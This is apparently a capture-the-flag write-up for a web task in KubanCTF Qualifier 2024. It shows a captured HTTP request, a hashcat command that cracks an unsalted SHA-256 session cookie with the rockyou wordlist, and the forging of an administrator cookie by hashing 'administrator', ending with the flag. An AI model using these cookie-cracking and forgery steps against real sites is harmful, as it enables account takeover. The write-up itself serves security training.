---
title: "Примечание - KubanCTF Qualifier 2024"
category: "web"
type: "writeup"
tags: ["web", "hashcat", "wordlists", "kubanctf-qualifier", "kubanctf-qualifier-2024", "2024", "ctf-writeup"]
summary: "GET /profile.php HTTP/1.1"
source:
  name: "CTFtime writeup #39478"
  url: "https://ctftime.org/writeup/39478"
original_source: "https://github.com/zer00d4y/writeups/blob/main/CTF%20events/KubanCTF/KubanCTF%20Qualifier%202024.md"
ctf:
  name: "KubanCTF Qualifier 2024"
  year: 2024
  challenge: "Примечание"
---

## Metadata

- **CTF:** KubanCTF Qualifier 2024
- **Task:** Примечание
- **Author team:** RedNet
- **CTFtime:** <https://ctftime.org/writeup/39478>
- **Original writeup:** <https://github.com/zer00d4y/writeups/blob/main/CTF%20events/KubanCTF/KubanCTF%20Qualifier%202024.md>

---
### WEB - Примечание

![image](<https://github.com/user-attachments/assets/5e8b51ff-ed39-44d6-b7a2-1ec88044fe47>)

![image](<https://github.com/user-attachments/assets/4a8c3879-3f5e-45e6-b85e-bd19d882ef44>)

![image](<https://github.com/user-attachments/assets/759a79e2-0319-4c5c-9c88-a9e46828fede>)

![image](<https://github.com/user-attachments/assets/db1a1837-c470-410b-bce6-651cfc55e770>)

![image](<https://github.com/user-attachments/assets/d2f501ea-be2e-4a50-944c-f0dc823deba8>)

Request

GET /profile.php HTTP/1.1  
Host: 62.173.147.143:16004  
Accept: */*  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36  
X-Requested-With: XMLHttpRequest  
Referer: http://62.173.147.143:16004/  
Accept-Encoding: gzip, deflate, br  
Accept-Language: ru-RU,ru;q=0.9  
Cookie: Token=ecd71870d1963316a97e3ac3408c9835ad8cf0f3c1bc703527c30265534f75ae  
Connection: close

Our token is `ecd71870d1963316a97e3ac3408c9835ad8cf0f3c1bc703527c30265534f75ae`

hashcat ecd71870d1963316a97e3ac3408c9835ad8cf0f3c1bc703527c30265534f75ae  
  
hashcat -m 1400 -a 0 'ecd71870d1963316a97e3ac3408c9835ad8cf0f3c1bc703527c30265534f75ae' /home/kali/wordlist/rockyou.txt

![image](<https://github.com/user-attachments/assets/03c4eca3-5f3d-4a48-815e-45ff70c44c12>)

![image](<https://github.com/user-attachments/assets/42c070bf-0377-4030-aee0-bbbcc73bd5ba>)

`cd71870d1963316a97e3ac3408c9835ad8cf0f3c1bc703527c30265534f75ae`:`test123`

![image](<https://github.com/user-attachments/assets/21981efc-cd52-490e-a6f0-e40c0a05a401>)

[[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)

echo -n 'administrator' | sha256sum 

![image](<https://github.com/user-attachments/assets/62c848cc-3846-424d-981e-387d711d5d1e>)

4194d1706ed1f408d5e02d672777019f4d5385c766a8c6ca8acba3167d36a7b9

![image](<https://github.com/user-attachments/assets/61fb9b8b-3909-434f-801b-f04eda3fabdb>)

![image](<https://github.com/user-attachments/assets/ba360d09-40dc-4633-b1e5-8732834be5ec>)

FLAG:

CSC{sup3r_w34k_co0ki3}
